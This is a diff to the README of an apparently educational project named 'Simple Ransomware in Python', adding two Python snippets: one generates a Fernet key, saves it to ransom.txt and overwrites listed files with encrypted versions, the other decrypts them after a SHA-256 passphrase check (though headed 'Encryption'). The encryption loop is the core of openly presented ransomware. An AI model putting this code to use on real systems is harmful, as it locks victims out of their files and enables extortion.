@@ -35,6 +35,18 @@ This project, **Simple Ransomware in Python**, is designed for educational purpo
 5. The contents of the selected files are replaced with their encrypted versions.
 6. A message is printed to the console, and a GUI notification warns the user that their files have been encrypted.
 
+#### Code Snippet (Encryption):
+```python
+ key = Fernet.generate_key()
+ with open("ransom.txt", "wb") as thekey:
+     thekey.write(key)
+
+ for file in files:
+     contents = open(file, "rb").read()
+     encrypted_contents = Fernet(key).encrypt(contents)
+     open(file, "wb").write(encrypted_contents)
+```
+
 ### Decryption Process:
 1. The `Decrypt.py` script prompts the user to input a secret phrase.
 2. The phrase is hashed using `SHA-256` and compared to a predefined secret hash.
@@ -42,6 +54,15 @@ This project, **Simple Ransomware in Python**, is designed for educational purpo
 4. The encrypted files are decrypted and restored to their original state.
 5. A success message is printed, and the user is notified via a GUI popup.
 6. If the secret phrase is incorrect, the decryption fails, and a warning message is displayed.
+
+   
+#### Code Snippet (Encryption):
+```python
+if hashlib.sha256(user_input.encode()).hexdigest() == secret_hash:
+    for file in files:
+        decrypted_contents = Fernet(secretkey).decrypt(open(file, "rb").read())
+        open(file, "wb").write(decrypted_contents)
+```
 
 
 
